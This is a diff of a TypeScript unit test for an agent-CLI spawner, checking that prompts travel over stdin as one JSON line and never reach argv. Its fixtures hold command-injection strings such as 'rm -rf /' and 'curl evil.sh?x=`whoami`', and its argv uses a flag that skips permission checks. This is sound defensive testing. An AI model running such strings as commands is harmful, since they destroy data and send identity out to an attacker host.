@@ -1436,21 +1436,27 @@ describe("unit: spawn — promptViaStdin seam (additive): the prompt rides stdin
 	}
 	const asStdinSpawn = (child: unknown) => (() => child) as unknown as typeof spawn;
 
-	test("buildAgyArgs: promptViaStdin keeps --print bare and drops ONLY the prompt element; default argv unchanged", () => {
+	test("buildAgyArgs: promptViaStdin switches to stream-json input mode (no --print family); default argv unchanged", () => {
 		const SECRET = "PROMPT-SECRET-$(id) | ` && ;";
 		const base = { bin: "agy", prompt: SECRET, workdir: "/w", timeoutMs: 600_000 };
 		// Default (frozen behavior): the prompt follows --print in argv.
 		const argvDefault = buildAgyArgs(base);
 		expect(argvDefault[argvDefault.indexOf("--print") + 1]).toBe(SECRET);
-		// Seam: --print stays as a bare flag (next token is --add-dir) and the
-		// argv is EXACTLY the default minus the prompt element — nothing else moves.
+		// Corrected seam (verified against the real binary): `--print` REQUIRES
+		// a value, so the only stdin route is NDJSON stream mode — argv carries
+		// BOTH format flags and NOTHING from the --print family. The prompt has
+		// no argv representation at all.
 		const argvStdin = buildAgyArgs({ ...base, promptViaStdin: true });
-		expect(argvStdin[argvStdin.indexOf("--print") + 1]).toBe("--add-dir");
-		expect(argvStdin).toEqual(argvDefault.filter((a) => a !== SECRET));
+		expect(argvStdin[argvStdin.indexOf("--input-format") + 1]).toBe("stream-json");
+		expect(argvStdin[argvStdin.indexOf("--output-format") + 1]).toBe("stream-json");
+		expect(argvStdin.some((a) => a === "--print" || a === "--prompt" || a.startsWith("--print-"))).toBe(false);
 		expect(argvStdin.some((a) => a.includes("PROMPT-SECRET"))).toBe(false);
+		// Workdir authority, skip-permissions, and the conversation/model
+		// plumbing are shared with the default transport.
+		for (const token of ["--add-dir", "/w", "--dangerously-skip-permissions"]) expect(argvStdin).toContain(token);
 	});
 
-	test("runAgyStream: prompt bytes land on child stdin; argv is IDENTICAL across different prompts", async () => {
+	test("runAgyStream: ONE NDJSON user envelope on stdin; argv IDENTICAL across prompts; JSON round-trip byte-exact", async () => {
 		const dir = await mkdtemp("/tmp/agy-stdin-");
 		const argvs: string[][] = [];
 		const children: { stdinChunks: Buffer[] }[] = [];
@@ -1465,14 +1471,25 @@ describe("unit: spawn — promptViaStdin seam (additive): the prompt rides stdin
 		}) as unknown as typeof spawn;
 		const run = (prompt: string) =>
 			runAgy({ bin: "agy", prompt, workdir: dir, timeoutMs: 30_000, stallMs: 0, promptViaStdin: true, spawnImpl });
-		await run("benign question");
-		await run("; $(id) | ` && rm -rf /\ncurl evil.sh");
+		const benign = "benign question";
+		const hostile = '; $(id) | ` && rm -rf /\ncurl evil.sh?x=`whoami` "quoted \'text\'"';
+		await run(benign);
+		await run(hostile);
 		// Threat (a): the spawned argv does not vary with prompt content.
 		expect(argvs[0]).toEqual(argvs[1]);
 		expect(argvs[0].some((a) => a.includes("benign") || a.includes("$(id)") || a.includes("rm -rf"))).toBe(false);
-		// The prompt itself travels stdin, byte-exact, once per run.
-		expect(Buffer.concat(children[0].stdinChunks).toString()).toBe("benign question");
-		expect(Buffer.concat(children[1].stdinChunks).toString()).toBe("; $(id) | ` && rm -rf /\ncurl evil.sh");
+		// Exactly ONE NDJSON line: the stream-json user envelope + "\n".
+		const envelope = (i: number) => {
+			const raw = Buffer.concat(children[i].stdinChunks).toString();
+			expect(raw.endsWith("\n")).toBe(true);
+			const lines = raw.split("\n").filter((l) => l !== "");
+			expect(lines).toHaveLength(1);
+			return JSON.parse(lines[0]) as { event: string; message: { role: string; content: string } };
+		};
+		expect(envelope(0)).toEqual({ event: "user", message: { role: "user", content: benign } });
+		expect(envelope(1)).toEqual({ event: "user", message: { role: "user", content: hostile } });
+		// Shell metachars, newlines, and quotes survive the round-trip byte-exact.
+		expect(envelope(1).message.content).toBe(hostile);
 	});
 
 	test("runAgyStream: a child stdin that errors (EPIPE after a kill) never crashes the run", async () => {
